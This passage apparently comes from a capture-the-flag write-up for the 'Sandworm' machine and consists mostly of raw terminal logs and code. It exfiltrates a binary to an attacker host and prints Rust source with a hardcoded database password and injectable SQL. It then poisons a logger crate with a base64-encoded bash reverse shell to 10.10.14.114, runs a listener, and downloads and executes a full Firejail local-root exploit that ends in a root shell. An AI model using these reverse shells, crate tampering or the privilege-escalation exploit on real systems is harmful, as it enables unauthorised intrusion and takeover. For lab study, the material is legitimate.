2023/06/21 07:04:01 CMD: UID=0 PID=42666 | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:04:01 CMD: UID=1000 PID=42667 | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:04:02 CMD: UID=1000 PID=42668 | rustc -vV
2023/06/21 07:04:02 CMD: UID=1000 PID=42669 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
2023/06/21 07:04:02 CMD: UID=1000 PID=42671 | /usr/bin/cargo run --offline
2023/06/21 07:04:11 CMD: UID=0 PID=42677 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:04:11 CMD: UID=0 PID=42678 | /bin/rm -r /opt/crates
2023/06/21 07:04:11 CMD: UID=0 PID=42679 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:05:01 CMD: UID=0 PID=42683 | /usr/sbin/CRON -f -P
2023/06/21 07:05:01 CMD: UID=0 PID=42685 | /bin/sh -c /bin/bash /root/Cleanup/clean.sh
2023/06/21 07:05:01 CMD: UID=0 PID=42684 | /bin/sh -c /bin/bash /root/Cleanup/clean.sh
2023/06/21 07:05:01 CMD: UID=0 PID=42686 |
2023/06/21 07:05:01 CMD: UID=0 PID=42687 | /bin/bash /root/Cleanup/clean.sh
2023/06/21 07:06:01 CMD: UID=0 PID=42691 | /usr/sbin/CRON -f -P
2023/06/21 07:06:01 CMD: UID=0 PID=42690 | /usr/sbin/CRON -f -P
2023/06/21 07:06:01 CMD: UID=0 PID=42693 | sleep 10
2023/06/21 07:06:01 CMD: UID=0 PID=42692 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2023/06/21 07:06:01 CMD: UID=0 PID=42696 | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:06:01 CMD: UID=0 PID=42694 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:06:01 CMD: UID=1000 PID=42697 | /usr/bin/cargo run --offline
2023/06/21 07:06:02 CMD: UID=1000 PID=42698 | rustc -vV
2023/06/21 07:06:02 CMD: UID=1000 PID=42699 | /usr/bin/cargo run --offline
2023/06/21 07:06:02 CMD: UID=1000 PID=42701 | /usr/bin/cargo run --offline
2023/06/21 07:06:02 CMD: UID=1000 PID=42703 | rustc -vV
2023/06/21 07:06:11 CMD: UID=0 PID=42707 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2023/06/21 07:06:11 CMD: UID=0 PID=42708 | /bin/rm -r /opt/crates
2023/06/21 07:06:11 CMD: UID=0 PID=42709 | /bin/cp -rp /root/Cleanup/crates /opt/
2023/06/21 07:06:12 CMD: UID=0 PID=42710 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:06:23 CMD: UID=0 PID=42714 |
2023/06/21 06:58:01 CMD: UID=1000 PID=42582 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
2023/06/21 06:56:11 CMD: UID=0 PID=42569 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
silentobserver@sandworm:/opt/tipnet/target/debug$ python3 -c "import requests;requests.post(\"http://10.10.14.114:
8000/upload\",files={\"files\":
open(\"/opt/tipnet/target/debug/tipnet\",\"rb\")})"
┌──(root㉿kali)-[~/work]
└─# python3 -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:
8000/) ...
10.129.34.14 - - [21/Jun/2023 03:46:35] [Uploaded] "tipnet" --> /root/work/tipnet
10.129.34.14 - - [21/Jun/2023 03:46:35] "POST /upload HTTP/1.1" 204 -
┌──(root㉿kali)-[~/work]
└─# md5sum tipnet
dda029937eaee34a45b00383960fc2f5 tipnet
silentobserver@sandworm:/opt/tipnet/target/debug$ md5sum tipnet
dda029937eaee34a45b00383960fc2f5 tipnet
silentobserver@sandworm:/opt/tipnet/target/debug$
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::
prelude::*;
use mysql::*;
use mysql::
prelude::*;
use std::fs;
use std::
process::
Command;
use std::io;

// We don't spy on you... much.

struct Entry {
 timestamp: String,
 target: String,
 source: String,
 data: String,
}

fn main() {
 println!("
 ,,
MMP\"\"MM\"\"YMM db `7MN. `7MF' mm
P' MM `7 MMN. M MM
 MM `7MM `7MMpdMAo. M YMb M .gP\"Ya mmMMmm
 MM MM MM `Wb M `MN. M ,M' Yb MM
 MM MM MM M8 M `MM.M 8M\"\"\"\"\"\" MM
 MM MM MM ,AP M YMM YM. , MM
 .JMML. .JMML. MMbmmd'.JML. YM `Mbmmd' `Mbmo
 MM
 .JMML.

");

 let mode = get_mode();

 if mode == "" {
 return;
 }
 else if mode != "upstream" && mode != "pull" {
 println!("[-] Mode is still being ported to Rust; try again later.");
 return;
 }

 let mut conn = connect_to_db("Upstream").unwrap();

 if mode == "pull" {
 let source = "/var/www/html/SSA/SSA/submissions";
 pull_indeces(&mut conn, source);
 println!("[+] Pull complete.");
 return;
 }

 println!("Enter keywords to perform the query:");
 let mut keywords = String::
new();
 io::
stdin().read_line(&mut keywords).unwrap();

 if keywords.trim() == "" {
 println!("[-] No keywords selected.\n\n[-] Quitting...\n");
 return;
 }

 println!("Justification for the search:");
 let mut justification = String::
new();
 io::
stdin().read_line(&mut justification).unwrap();

 // Get Username
 let output = Command::
new("/usr/bin/whoami")
 .output()
 .expect("nobody");

 let username = String::
from_utf8(output.stdout).unwrap();
 let username = username.trim();

 if justification.trim() == "" {
 println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
 logger::
log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
 return;
 }

 logger::
log(username, keywords.as_str().trim(), justification.as_str());

 search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

 let valid = false;
 let mut mode = String::
new();

 while ! valid {
 mode.clear();

 println!("Select mode of usage:");
 print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

 io::
stdin().read_line(&mut mode).unwrap();

 match mode.trim() {
 "a" => {
 println!("\n[+] Upstream selected");
 return "upstream".to_string();
 }
 "b" => {
 println!("\n[+] Muscular selected");
 return "regular".to_string();
 }
 "c" => {
 println!("\n[+] Tempora selected");
 return "emperor".to_string();
 }
 "d" => {
 println!("\n[+] PRISM selected");
 return "square".to_string();
 }
 "e" => {
 println!("\n[!] Refreshing indeces!");
 return "pull".to_string();
 }
 "q" | "Q" => {
 println!("\n[-] Quitting");
 return "".to_string();
 }
 _ => {
 println!("\n[!] Invalid mode: {}", mode);
 }
 }
 }
 return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::
PooledConn> {
 let url = "mysql://tipnet:
4The_Greater_GoodJ4A@localhost:
3306/Upstream";
 let pool = Pool::
new(url).unwrap();
 let mut conn = pool.get_conn().unwrap();
 return Ok(conn);
}

fn search_sigint(conn: &mut mysql::
PooledConn, keywords: &str) {
 let keywords: Vec<&str> = keywords.split(" ").collect();
 let mut query = String::
from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

 for (i, keyword) in keywords.iter().enumerate() {
 if i > 0 {
 query.push_str("OR ");
 }
 query.push_str(&format!("data LIKE '%{}%' ", keyword));
 }
 let selected_entries = conn.query_map(
 query,
 |(timestamp, target, source, data)| {
 Entry { timestamp, target, source, data }
 },
 ).expect("Query failed.");
 for e in selected_entries {
 println!("[{}] {} ===> {} | {}",
 e.timestamp, e.source, e.target, e.data);
 }
}

fn pull_indeces(conn: &mut mysql::
PooledConn, directory: &str) {
 let paths = fs::
read_dir(directory)
 .unwrap()
 .filter_map(|entry| entry.ok())
 .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
 .map(|entry| entry.path());

 let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :
hash")
 .unwrap();
 let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:
timestamp, :
data, :
hash)")
 .unwrap();

 let now = Utc::
now();

 for path in paths {
 let contents = fs::
read_to_string(path).unwrap();
 let hash = Sha256::
digest(contents.as_bytes());
 let hash_hex = hex::
encode(hash);

 let existing_en
try: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
 if existing_entry.is_none() {
 let date = now.format("%Y-%m-%d").to_string();
 println!("[+] {}\n", contents);
 conn.exec_drop(&stmt_insert, params! {
 "timestamp" => date,
 "data" => contents,
 "hash" => &hash_hex,
 },
 ).unwrap();
 }
 }
 logger::
log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
extern crate chrono;

use std::fs::
OpenOptions;
use std::io::
Write;
use chrono::
prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
 let now = Local::
now();
 let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
 let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

 let mut file = match OpenOptions::
new().append(true).create(true).open("/opt/tipnet/access.log") {
 Ok(file) => file,
 Err(e) => {
 println!("Error opening log file: {}", e);
 return;
 }
 };

 if let Err(e) = file.write_all(log_message.as_bytes()) {
 println!("Error writing to log file: {}", e);
 }
}
extern crate chrono;

use std::fs::
OpenOptions;
use std::io::
Write;
use chrono::
prelude::*;

use std::
process::
Command;

pub fn log(user: &str, query: &str, justification: &str) {
 let now = Local::
now();
 let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
 let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

 let mut file = match OpenOptions::
new().append(true).create(true).open("/opt/tipnet/access.log") {
 Ok(file) => file,
 Err(e) => {
 println!("Error opening log file: {}", e);
 return;
 }
 };

 let output = Command::
new("bash")
 .args(["-c", justification])
 .output()
 .expect("Failed to execute command");

 if let Err(e) = file.write_all(log_message.as_bytes()) {
 println!("Error writing to log file: {}", e);
 }
}
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvMTIzNCAwPiYx | base64 -d | /usr/bin/bash
┌──(root㉿kali)-[~/work]
└─# nc -lnvp 1234
listening on [any] 1234 ...
2023/06/21 07:06:01 CMD: UID=0 PID=42694 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
extern crate chrono;

use std::
process::
Command;

use std::fs::
OpenOptions;
use std::io::
Write;
use chrono::
prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
 let now = Local::
now();
 let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
 let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

 let mut file = match OpenOptions::
new().append(true).create(true).open("/opt/tipnet/access.log") {
 Ok(file) => file,
 Err(e) => {
 println!("Error opening log file: {}", e);
 return;
 }
 };

 let output = Command::
new("bash")
 .args(["-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0MSAwPiYx | base64 -d | bash"])
 .output()
 .expect("Failed to execute command");

 if let Err(e) = file.write_all(log_message.as_bytes()) {
 println!("Error writing to log file: {}", e);
 }
}
atlas@sandworm:~$ wget http://10.10.14.114/firejoin_py.bin
wget http://10.10.14.114/firejoin_py.bin
--2023-06-21 15:34:32-- http://10.10.14.114/firejoin_py.bin
Connecting to 10.10.14.114:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8651 (8.4K) [application/octet-stream]
Saving to: ‘firejoin_py.bin’

 0K ........ 100% 14.6M=0.001s

2023-06-21 15:34:33 (14.6 MB/s) - ‘firejoin_py.bin’ saved [8651/8651]

atlas@sandworm:~$ chmod +x firejoin_py.bin
chmod +x firejoin_py.bin
atlas@sandworm:~$ ./firejoin_py.bin
./firejoin_py.bin
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
# invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
 kwargs['file'] = sys.stderr
 print(*args, **kwargs)
 sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
 s = os.stat(f)

 if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
 return False

 with open(f) as fd:
 ch = fd.read(2)

 if len(ch) != 1 or ch != "1":
 return False

 return True

def mountTmpFS(loc):
 subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
 subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
 s = os.stat(__file__)

 if (s.st_mode & stat.S_IXUSR) == 0:
 printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
 # just run a long sleep command in an unsecured sandbox
 proc = subprocess.Popen(
 "firejail --noprofile -- sleep 10d".split(),
 stderr=subprocess.PIPE)

 # read out the child PID from the stderr output of firejail
 while True:
 line = proc.stderr.readline()
 if not line:
 raise Exception("helper sandbox creation failed")

 # on stderr a line of the form "Parent pid , child pid " is output
 line = line.decode('utf8').strip().lower()
 if line.find("child pid") == -1:
 continue

 child_pid = line.split()[-1]

 try:
 child_pid = int(child_pid)
 break
 
except Exception:
 raise Exception("failed to determine child pid from helper sandbox")

 # We need to find the child process of the child PID, this is the
 # actual sleep process that has an accessible root filesystem in /proc
 children = f"/proc/{child_pid}/task/{child_pid}/children"

 # If we are too quick then the child does not exist yet, so sleep a bit
 for _ in range(10):
 with open(children) as cfd:
 line = cfd.read().strip()
 kids = line.split()
 if not kids:
 time.sleep(0.5)
 continue
 elif len(kids) != 1:
 raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

 try:
 sleep_pid = int(kids[0])
 break
 
except Exception:
 raise Exception("failed to determine sleep child PID from helper sandbox")
 else:
 raise Exception(f"sleep child process did not come into existence in {children}")

 join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
 if not os.path.exists(join_file):
 raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

 return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

 if not checkFile(join_file):
 printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

 os.environ["FIREJOIN_JOINFILE"] = join_file
 os.environ["FIREJOIN_UNSHARED"] = "1"

 unshare = shutil.which("unshare")
 if not unshare:
 printe("could not find 'unshare' program")

 cmdline = "unshare -U -r -m".split()
 cmdline += [__file__]

 # Re-execute this script with unshared user and mount namespaces
 subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
 # First stage of execution, we first need to fork off a helper sandbox and
 # an exploit environment
 checkSelfExecutable()
 helper_proc, join_file = createHelperSandbox()
 reexecUnshared(join_file)

 helper_proc.kill()
 helper_proc.wait()
 sys.exit(0)
else:
 # We are in the sandbox environment, the suitable join file has been
 # forwarded from the first stage via the environment
 join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
 mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
 # This is a special case for Fedora Linux where SELinux rules prevent us
 # from mounting a tmpfs over proc directories.
 # We can still circumvent this by mounting a tmpfs over all of /proc, but
 # we need to bind-mount a copy of our own time namespace first that we can
 # symlink to.
 with open("/tmp/time", 'w') as _:
 pass
 time_ns_src = "/tmp/time"
 bindMount("/proc/self/ns/time", time_ns_src)
 mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
 umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
 tf.write("auth sufficient pam_permit.so\n")
 tf.write("account sufficient pam_unix.so\n")
 tf.write("session sufficient pam_unix.so\n")

 # Be agnostic about the PAM config file location in /etc or /usr/etc
 for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
 if not os.path.isdir(pamd):
 continue
 for service in ("su", "sudo"):
 service = Path(pamd) / service
 if not service.exists():
 continue
 # Bind mount over new "helpful" PAM config over the original
 bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
 line = sys.stdin.readline()
 if not line:
 break
cmdline = "unshare -U -r -m".split()
 cmdline += [__file__]

 # Re-execute this script with unshared user and mount namespaces
 subprocess.call(cmdline)
atlas@sandworm:~$ firejail --join=5696
firejail --join=5696
Error: no valid sandbox
atlas@sandworm:~$ firejail --join=5701
firejail --join=5701
Warning: cleaning all supplementary groups
changing root to /proc/5701/root
Child process initialized in 9.94 ms
su -
whoami
root
```
